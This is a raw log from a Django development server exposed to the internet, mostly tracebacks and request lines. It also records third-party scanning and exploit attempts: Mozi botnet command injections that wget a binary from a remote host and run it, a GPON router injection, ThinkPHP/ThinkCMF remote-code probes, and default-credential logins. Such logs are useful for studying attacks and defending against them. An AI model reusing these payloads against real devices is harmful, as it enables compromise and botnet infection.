  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[17/Oct/2020 00:18:19] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 179
[17/Oct/2020 00:36:15] "GET / HTTP/1.1" 200 643
[17/Oct/2020 01:40:53] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 179
[17/Oct/2020 01:40:53] code 400, message Bad request syntax (';sh+/tmp/gpon80&ipv=0')
[17/Oct/2020 01:40:53] ";sh+/tmp/gpon80&ipv=0" 400 -
[17/Oct/2020 01:51:30] "GET / HTTP/1.1" 200 643
[17/Oct/2020 02:09:16] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 179
[17/Oct/2020 02:12:38] code 400, message Bad request version ('¡ã\xd9\xe5')
[17/Oct/2020 02:12:38] You're accessing the development server over HTTPS, but it only supports HTTP.

[17/Oct/2020 02:12:38] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01"\x01\x00\x01')
[17/Oct/2020 02:12:38] You're accessing the development server over HTTPS, but it only supports HTTP.

[17/Oct/2020 02:12:38] code 400, message Bad request syntax ('\x16\x03\x01\x00\xc6\x01\x00\x00\xc2\x03\x02@[\xd1\x96\xca\x8d\x9ft\xcc¨¦P\xa3\xaf\x85b\xbd\xd6\r¡Â0\xfbk\xf5\xd2\x1eu\xcd\xd5\xb9\xa1\xa3\xbb\x00\x00P\xc0\x14\xc0')
[17/Oct/2020 02:12:38] You're accessing the development server over HTTPS, but it only supports HTTP.

[17/Oct/2020 02:12:38] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\xc6\x01\x00\x00\xc2\x03\x01\xff\xe6')
[17/Oct/2020 02:12:38] You're accessing the development server over HTTPS, but it only supports HTTP.

[17/Oct/2020 02:12:38] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('101.251.242.238', 60068)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[17/Oct/2020 02:56:35] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('167.248.133.36', 35798)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[17/Oct/2020 02:57:47] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('167.248.133.36', 42384)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[17/Oct/2020 02:57:47] "GET / HTTP/1.1" 200 643
[17/Oct/2020 03:26:17] "GET / HTTP/1.1" 200 643
[17/Oct/2020 03:55:36] "GET / HTTP/1.1" 200 643
[17/Oct/2020 04:14:00] "GET / HTTP/1.1" 200 643
[17/Oct/2020 04:15:29] "GET / HTTP/1.1" 200 643
[17/Oct/2020 04:28:02] "GET / HTTP/1.1" 200 643
[17/Oct/2020 06:54:27] "GET / HTTP/1.1" 200 643
[17/Oct/2020 07:59:54] "GET / HTTP/1.1" 200 643
[17/Oct/2020 08:17:33] "GET / HTTP/1.1" 200 643
[17/Oct/2020 08:19:25] "GET / HTTP/1.1" 200 643
[17/Oct/2020 08:43:09] "GET / HTTP/1.1" 200 643
[17/Oct/2020 09:09:22] "GET /phpmyadmin/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('123.54.211.11', 11447)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[17/Oct/2020 09:14:14] "POST /HNAP1/ HTTP/1.0" 404 179
[17/Oct/2020 09:53:22] "GET / HTTP/1.1" 200 643
[17/Oct/2020 10:01:35] "CONNECT ip.ws.126.net:443 HTTP/1.1" 404 179
[17/Oct/2020 11:09:32] "GET / HTTP/1.1" 200 643
[17/Oct/2020 11:18:41] "GET http://www.qq.com/404/search_children.js HTTP/1.1" 404 179
[17/Oct/2020 11:18:51] code 400, message Bad request syntax ('\x05\x01\x00')
[17/Oct/2020 11:18:51] " " 400 -
[17/Oct/2020 11:18:51] code 400, message Bad request syntax ('\x04\x01\x00PpTi4\x00')
[17/Oct/2020 11:18:51] " PpTi4 " 400 -
[17/Oct/2020 12:05:39] "GET / HTTP/1.1" 200 643
[17/Oct/2020 12:15:10] "GET / HTTP/1.1" 200 643
[17/Oct/2020 12:15:10] "GET / HTTP/1.1" 200 643
[17/Oct/2020 12:15:10] "GET /favicon.ico HTTP/1.1" 404 179
[17/Oct/2020 12:22:43] "GET / HTTP/1.1" 200 643
[17/Oct/2020 12:34:14] "GET / HTTP/1.1" 200 643
[17/Oct/2020 13:06:04] "GET / HTTP/1.1" 200 643
[17/Oct/2020 14:11:37] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 45074)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[17/Oct/2020 14:54:51] "GET / HTTP/1.1" 200 643
[17/Oct/2020 15:09:04] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 179
[17/Oct/2020 15:09:17] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 179
[17/Oct/2020 15:24:46] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 643
[17/Oct/2020 15:38:45] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('59.36.132.240', 43966)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[17/Oct/2020 15:42:09] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 643
[17/Oct/2020 15:42:28] "GET / HTTP/1.1" 200 643
[17/Oct/2020 15:52:27] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 179
[17/Oct/2020 16:52:42] "GET / HTTP/1.0" 200 643
[17/Oct/2020 17:09:14] "GET / HTTP/1.1" 200 643
[17/Oct/2020 17:13:22] "GET / HTTP/1.0" 200 643
[17/Oct/2020 18:31:44] "GET / HTTP/1.0" 200 643
[17/Oct/2020 18:35:19] "GET /portal/redlion HTTP/1.1" 404 179
[17/Oct/2020 18:59:21] "POST /api/jsonws/invoke HTTP/1.1" 404 179
[17/Oct/2020 20:11:07] "GET / HTTP/1.1" 200 643
[17/Oct/2020 20:11:07] "GET /welcome/ HTTP/1.1" 200 883
[17/Oct/2020 21:17:02] "GET / HTTP/1.1" 200 643
[17/Oct/2020 21:17:14] "GET / HTTP/1.1" 200 643
[17/Oct/2020 21:25:00] "GET / HTTP/1.1" 200 643
[17/Oct/2020 21:25:53] "GET / HTTP/1.0" 200 643
----------------------------------------
Exception happened during processing of request from ('61.219.11.153', 61942)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[17/Oct/2020 22:13:17] "GET / HTTP/1.1" 200 643
[17/Oct/2020 22:36:45] "GET / HTTP/1.0" 200 643
[17/Oct/2020 22:45:33] "GET / HTTP/1.1" 200 643
[17/Oct/2020 23:37:23] "GET /manager/html HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('154.213.25.70', 57418)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[17/Oct/2020 23:42:03] "GET / HTTP/1.1" 200 643
[18/Oct/2020 00:53:43] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('74.120.14.52', 52566)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 00:53:44] "GET / HTTP/1.1" 200 643
[18/Oct/2020 01:23:46] "GET http://150.158.7.54/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 54463)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 01:34:01] "GET http://150.158.7.54/solr/admin/info/system?wt%3Djson HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 43135)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 01:46:03] "GET / HTTP/1.1" 200 643
[18/Oct/2020 01:47:28] "GET http://150.158.7.54/?XDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('183.192.179.16', 42003)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 02:57:07] "GET / HTTP/1.1" 200 643
[18/Oct/2020 03:10:42] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('162.142.125.52', 48042)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 03:19:42] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('162.142.125.52', 53610)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 03:19:42] "GET / HTTP/1.1" 200 643
[18/Oct/2020 03:22:50] "GET / HTTP/1.1" 200 643
[18/Oct/2020 03:31:53] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('183.192.179.16', 46969)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 03:39:15] "GET / HTTP/1.1" 200 643
[18/Oct/2020 03:51:18] "GET / HTTP/1.0" 200 643
[18/Oct/2020 04:07:54] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 179
[18/Oct/2020 04:08:06] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 179
[18/Oct/2020 04:18:06] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 643
[18/Oct/2020 04:28:23] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 643
[18/Oct/2020 04:33:45] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 179
[18/Oct/2020 06:25:15] "POST /api/jsonws/invoke HTTP/1.1" 404 179
[18/Oct/2020 06:53:42] "GET / HTTP/1.1" 200 643
[18/Oct/2020 07:03:09] "GET / HTTP/1.1" 200 643
[18/Oct/2020 07:34:08] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('73.255.185.12', 51467)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 07:34:09] "GET / HTTP/1.1" 200 643
[18/Oct/2020 07:38:43] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('101.89.19.140', 46677)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 07:40:38] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 179
[18/Oct/2020 07:54:23] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
[18/Oct/2020 07:54:23] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 -
[18/Oct/2020 08:18:57] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('110.52.29.235', 32006)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 08:23:30] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('45.148.121.85', 50266)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 08:24:15] "HEAD /robots.txt HTTP/1.0" 404 179
[18/Oct/2020 08:36:18] "GET / HTTP/1.0" 200 643
[18/Oct/2020 08:37:38] "GET / HTTP/1.1" 200 643
[18/Oct/2020 08:57:00] "GET / HTTP/1.1" 200 643
[18/Oct/2020 09:23:30] "GET / HTTP/1.1" 200 643
[18/Oct/2020 10:11:32] "GET / HTTP/1.1" 200 643
[18/Oct/2020 11:07:10] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179
[18/Oct/2020 11:12:43] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 179
[18/Oct/2020 12:12:44] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179
[18/Oct/2020 12:53:04] "GET / HTTP/1.1" 200 643
[18/Oct/2020 14:30:21] "GET / HTTP/1.0" 200 643
[18/Oct/2020 15:48:17] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('18.162.154.186', 45922)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 15:56:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[18/Oct/2020 15:56:46] "  /*¨¤     Cookie: mstshash=Administr" 400 -
[18/Oct/2020 16:22:30] "GET /hudson HTTP/1.1" 404 179
[18/Oct/2020 18:39:35] "GET / HTTP/1.0" 200 643
[18/Oct/2020 19:09:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[18/Oct/2020 19:09:32] "  /*¨¤     Cookie: mstshash=Administr" 400 -
----------------------------------------
Exception happened during processing of request from ('210.166.230.64', 41015)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[18/Oct/2020 22:37:09] "GET / HTTP/1.0" 200 643
[18/Oct/2020 22:53:25] "GET / HTTP/1.1" 200 643
[18/Oct/2020 23:20:30] "GET / HTTP/1.1" 200 643
[18/Oct/2020 23:32:55] "GET / HTTP/1.1" 200 643
[19/Oct/2020 00:07:41] "GET / HTTP/1.1" 200 643
[19/Oct/2020 00:24:55] "GET / HTTP/1.1" 200 643
[19/Oct/2020 00:27:51] "GET / HTTP/1.1" 200 643
[19/Oct/2020 00:59:13] "GET / HTTP/1.1" 200 643
[19/Oct/2020 01:07:07] "GET / HTTP/1.0" 200 643
[19/Oct/2020 01:15:59] "GET / HTTP/1.1" 200 643
[19/Oct/2020 01:16:00] "GET /ab2h HTTP/1.1" 404 179
[19/Oct/2020 01:16:01] "GET /ab2g HTTP/1.1" 404 179
[19/Oct/2020 01:16:01] code 400, message Bad request version ('{=D\x8c\xa1\xbcd¡§\xe3\xbc\xde$"\x17h¡§\xe3\xbce\xac\xa1\xbcd¡§¨¤\xb4d¡§\xe3\xbcd¡§\xe3\xbc\xce¡§\xe3\xbcd¡§\xc8\x97d¡§\xe3\xbcL¡§\xe3\xbcd¡§\xe3\xbcd¡§\xe3\xbcd¡§\xe3\xbce\xa9\xe3\xbcd¡§\xf5\xbcd¡§\xe3\xbcd¡§\xe3\xbcd¡§\xe3\xbcd¡§\xe3\xbcd¡§\xe7\xbcd¡§\xe3\xbcd¡§\xe3\xbc\x04\x00')
